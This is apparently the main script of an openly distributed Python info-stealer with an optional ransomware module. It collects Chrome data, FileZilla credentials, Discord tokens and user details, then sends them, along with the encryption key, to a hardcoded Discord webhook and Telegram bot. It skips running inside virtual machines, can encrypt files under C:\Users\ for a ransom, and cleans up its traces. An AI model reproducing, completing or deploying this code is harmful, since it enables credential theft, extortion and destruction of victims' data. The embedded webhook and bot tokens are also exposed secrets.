#  Developed By security Owner of 
#  poopsec 
#  kos
#  Need help then Join the telegram https://t.me/+HyVCbHaErR1lYTlk

import os
import base64
from colorama import *
from plugins.screenshot import Screenshot
from plugins.antivm import AntiVM
from plugins.filezilla import FileZilla
from plugins.discord import Discord
from plugins.send_telegram import Send_Telegram
from plugins.send_discord import Send_Discord
from plugins.user import User
from plugins.chrome import Chrome
from plugins.ransomware import Ransomware
from plugins.cleanup import CleanUp

CONFIG = {
    "webhook" : "https://discord.com/api/webhooks/1135745003604430878/MTjCGvBPLpLeWeLTfeZg4RNzl2jP4pToaLtrZ1CnvFl4y4Ai6dojaYnCejzkCPdFmBjM", # Webhook here 
    "chrome" : True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
    "filezilla":True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
    "userdata":True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
    "discord":True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
    "send_discord": True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
    "send_telegram": True,  # make sure if you want any of these to not work set them to 'False' if you want them to work Keep them as 'True'
    "telegram_token": "6248198822:AAHQddndAoI0gTrEuY7LO347nzfwvs4gofM", # Create a bot with Bot Father and obtain the bot token 
    "telegram_chat_id": "5771044879", # Create a bot with Bot Father and obtain the bot chat ID if you dont know how to any of these go on youtube
    "ransomware" : {
        "enabled" : False, # Keep this on False unless your sending it to someone or your testing on a VM
        "target_dir" : "C:\\Users\\", # Dont change anything unless you know what you are doing 
        "extenstion" : ".poopfart", # Dont change anything unless you know what you are doing
        "btcAddy" : "idonthaveoneyetlol",
        "email" : "isis101@gmail.com"
    }
}

class Stealer():
    def __init__(self):
        self.antivm = AntiVM()
        self.filezilla = FileZilla()
        self.user = User()
        self.chrome = Chrome()
        self.discord = Discord()
        self.ransomware_key = os.urandom(32)
        self.log()
        if CONFIG["send_discord"] == True:
            self.send = Send_Discord(CONFIG["webhook"],
                            self.user.userdata,
                            base64.b64encode(self.ransomware_key),
                            CONFIG["ransomware"]["enabled"])
        else:
            pass
        if CONFIG["send_telegram"] == True:
            self.send = Send_Telegram(CONFIG["telegram_token"],
                            CONFIG["telegram_chat_id"],
                            self.user.userdata,
                            base64.b64encode(self.ransomware_key),
                            CONFIG["ransomware"]["enabled"])
        else:
            pass            
        self.rpoopfart()
        self.cleanup = CleanUp()
        print("Done!")

    def log(self):
        app_data = os.getenv("LOCALAPPDATA")
        temp = os.path.join(app_data, "poopfart")
        os.mkdir(temp)
        if self.filezilla.saved != "" and CONFIG["filezilla"] == True:
            with open(temp + "\\filezilla.txt", "w") as filezilla_file:
                filezilla_file.write(self.filezilla.saved)
                filezilla_file.flush()
                filezilla_file.close()

        if self.user.userdata != "" and CONFIG["userdata"] == True:
            with open(temp + "\\user.txt", "w") as user_file:
                user_file.write(self.user.userdata)
                user_file.flush()
                user_file.close()

        if self.chrome.stored != "" and CONFIG["chrome"] == True:
            with open(temp + "\\chrome.txt", "w") as chrome_file:
                chrome_file.write(self.chrome.stored)
                chrome_file.flush()
                chrome_file.close()

        if self.discord.saved != "" and CONFIG["discord"] == True:
            with open(temp + "\\discord.txt", "w") as discord_file:
                discord_file.write(self.discord.saved)
                discord_file.flush()
                discord_file.close()

    def rpoopfart(self):
        """
        """
        if CONFIG["ransomware"]["enabled"]:
            Ransomware(self.ransomware_key,
                       CONFIG["ransomware"]["target_dir"], # dont change these either
                       CONFIG["ransomware"]["extenstion"], # dont change these either
                       CONFIG["ransomware"]["btcAddy"], # dont change these either
                       CONFIG["ransomware"]["email"]) # dont change these either

init(convert=True)

if __name__ == "__main__":
    if AntiVM().inVM() == False:
        Stealer()
